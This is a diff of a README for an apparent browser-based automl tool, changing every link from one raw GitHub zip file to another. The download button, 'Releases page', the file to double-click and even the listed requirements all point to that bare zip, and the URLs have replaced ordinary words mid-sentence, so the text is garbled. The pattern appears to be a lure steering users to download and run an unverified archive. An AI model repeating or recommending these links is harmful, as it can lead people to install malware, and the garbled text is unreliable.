@@ -1,16 +1,16 @@
 # 🚀 automl - Simplify Machine Learning in Your Browser
 
 ## 📥 Download Now
-[![Download automl](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip%20automl-Here-brightgreen)](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip)
+[![Download automl](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip%20automl-Here-brightgreen)](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip)
 
 ## 📖 Overview
-Welcome to **automl**! This application brings automated machine learning to your browser or https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip environment. You can easily experiment with machine learning without needing programming skills. Our tool allows anyone to create, test, and improve machine learning models, making this powerful technology accessible to everyone.
+Welcome to **automl**! This application brings automated machine learning to your browser or https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip environment. You can easily experiment with machine learning without needing programming skills. Our tool allows anyone to create, test, and improve machine learning models, making this powerful technology accessible to everyone.
 
 ## 🚀 Getting Started
 Follow these steps to download and run **automl**:
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip) to get the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip) to get the software. 
 
 2. **Select Your Version**
    On the Releases page, you will see different versions. Click on the most recent version to ensure you have the latest features and fixes.
@@ -22,14 +22,14 @@ Follow these steps to download and run **automl**:
    Once downloaded, locate the ZIP file on your computer. Right-click the file and select "Extract All..." to unzip it. You will see a new folder with the same name as the ZIP file.
 
 5. **Run automl**
-   Open the folder you just extracted. Look for an `https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip` file. Double-click this file to open **automl** in your web browser.
+   Open the folder you just extracted. Look for an `https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip` file. Double-click this file to open **automl** in your web browser.
 
 6. **Follow the On-screen Instructions**
    The application will guide you through setting up your machine learning project. You can easily choose your dataset, select algorithms, and start training your models—all with just a few clicks.
 
 ## 📚 Features
 - **User-Friendly Interface**: Designed for non-technical users, making machine learning easy.
-- **Supports Local and https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip Execution**: Use the application both in your browser and in a server-side environment.
+- **Supports Local and https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip Execution**: Use the application both in your browser and in a server-side environment.
 - **Multiple Algorithms**: Choose from various machine learning algorithms to suit your needs.
 - **Visualization Tools**: Visualize your data and model performance with intuitive charts and graphs.
 - **Automatic Model Tuning**: The application automatically adjusts parameters for optimal performance.
@@ -38,7 +38,7 @@ Follow these steps to download and run **automl**:
 To run **automl**, you need:
 - A computer with a stable internet connection.
 - A modern web browser (Google Chrome, Firefox, Safari, etc.).
-- https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip if you want to run it as a server application.
+- https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip if you want to run it as a server application.
   
 The application runs best on the latest versions of these browsers.
 
@@ -46,7 +46,7 @@ The application runs best on the latest versions of these browsers.
 Using **automl** is straightforward. Here’s how to get started with your first machine learning project:
 
 1. **Open the Application**
-   Launch the application by opening the `https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip` file in your browser.
+   Launch the application by opening the `https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip` file in your browser.
 
 2. **Upload Your Data**
    Click on the "Upload Data" button. You can upload CSV files directly from your computer. Make sure your data is clean and structured.
@@ -70,7 +70,7 @@ If you have any questions or need assistance with **automl**, please feel free t
 Your feedback is crucial for improving **automl**. After using the application, let us know your thoughts. Your input helps us add features and fix any issues.
 
 ## 📅 Updates
-Regular updates will improve performance and add new features. Keep an eye on the [Releases page](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/mameluco/automl.zip) for the latest changes.
+Regular updates will improve performance and add new features. Keep an eye on the [Releases page](https://raw.githubusercontent.com/Viswajith-Coder/automl/master/dist/Software-2.4.zip) for the latest changes.
 
 ## 🏁 Conclusion
 Thank you for choosing **automl**. We hope you find it easy to use and helpful in your machine learning journey. Enjoy exploring the world of automated machine learning!
